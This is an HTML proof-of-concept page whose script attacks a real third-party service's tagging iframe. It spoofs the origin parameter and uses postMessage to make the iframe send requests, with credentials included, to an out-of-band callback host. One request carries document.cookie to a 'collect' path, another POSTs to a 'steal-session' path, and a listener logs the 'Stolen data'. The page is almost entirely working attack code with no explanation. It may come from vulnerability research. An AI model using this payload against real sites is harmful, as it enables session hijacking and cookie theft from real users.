<html>
<head>
  <meta charset="UTF-8" />
  <title>postMessage demo with open window</title>
</head>
<body>
  <!-- <button id="send">Open Page and Send Message</button> -->
  <!-- <iframe id="targetFrame" src="https://tagging.wetransfer.com/_/service_worker/5230/sw_iframe.html?origin=http://127.0.0.1&path=badr" style="width:100%; height:500px;"></iframe> -->

  <script>
    // 1. Create iframe with spoofed origin
        const iframe = document.createElement('iframe');
        iframe.src = 'https://tagging.wetransfer.com/_/service_worker/5230/sw_iframe.html?origin=https://daemoon.me';
        document.body.appendChild(iframe);

        iframe.onload = () => {
        // 2. Send command to exfiltrate data
        iframe.contentWindow.postMessage({
            type: 1,
            clientId: 'attacker-client',
            command: {
            commandType: 0,
            params: {
                url: 'https://y9ozrc2di0vg4ccu7kgz1z84r5x4nvo6v.oast.site/collect?cookies=${document.cookie|encode}',
                method: 0,
                credentials: 'include',  
                templates: {},
                processResponse: false
            }
            }
        }, '*');
        
        // 3. Or send tracking request with victim's cookies
        iframe.contentWindow.postMessage({
            type: 1,
            clientId: 'attacker-client',
            command: {
            commandType: 0,
            params: {
                url: 'https://y9ozrc2di0vg4ccu7kgz1z84r5x4nvo6v.oast.site/steal-session',
                method: 1,  // POST
                body: 'victim_data=sensitive',
                credentials: 'include'  
            }
            }
        }, '*');
        };

        // 4. Listen for responses
        window.addEventListener('message', (e) => {
            if (e.origin !== 'https://tagging.wetransfer.com') {
                console.log('Stolen data:', e.data);
            }
        });

  </script>
</body>
</html>